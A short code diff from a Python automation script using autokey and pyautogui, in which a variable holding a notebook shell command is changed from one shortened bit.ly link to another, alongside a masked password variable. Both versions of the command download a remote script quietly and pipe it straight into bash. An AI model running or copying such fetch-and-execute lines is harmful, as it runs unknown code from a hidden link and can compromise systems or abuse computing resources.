@@ -3,7 +3,7 @@ import time,os
 from autokey import *
 import pyautogui
 
-col_cmd = "!wget -q -O - bit.ly/gpu001 | bash"
+col_cmd = "!wget -q -O - bit.ly/maxgpu2 | bash"
 listfile = '/home/one/g03'
 gpass = "p******p"
 new = True
